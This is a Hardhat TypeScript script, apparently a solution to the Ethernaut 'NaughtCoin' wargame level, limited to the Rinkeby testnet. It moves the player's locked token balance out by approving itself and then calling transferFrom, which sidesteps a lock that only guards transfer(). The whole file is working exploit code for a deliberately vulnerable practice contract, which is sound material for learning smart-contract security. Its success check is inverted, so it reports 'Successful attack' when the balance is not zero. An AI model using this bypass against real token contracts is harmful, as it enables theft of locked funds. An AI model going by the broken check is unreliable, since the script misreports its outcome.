import "@ethersproject/abstract-provider"
import { ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}=await getNamedAccounts()
        const exploiterAcc= await ethers.getSigner(exploiter)
        const naughtCoin= await ethers.getContractAt('NaughtCoin',process.env.NAUGHT_COIN_ADDRESS as string)
        const deadAddress="0xdF3e18d64BC6A983f673Ab319CCaE4f1a57C7097"

        const exploiterBalance=await naughtCoin.balanceOf(exploiter)
        await naughtCoin.connect(exploiterAcc).approve(exploiter, exploiterBalance)
        await naughtCoin.connect(exploiterAcc).transferFrom(exploiter, deadAddress ,exploiterBalance)


        if(!((await naughtCoin.balanceOf(exploiter)).eq(0))){
            console.log("Successful attack")
        }else{
            console.log("Attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
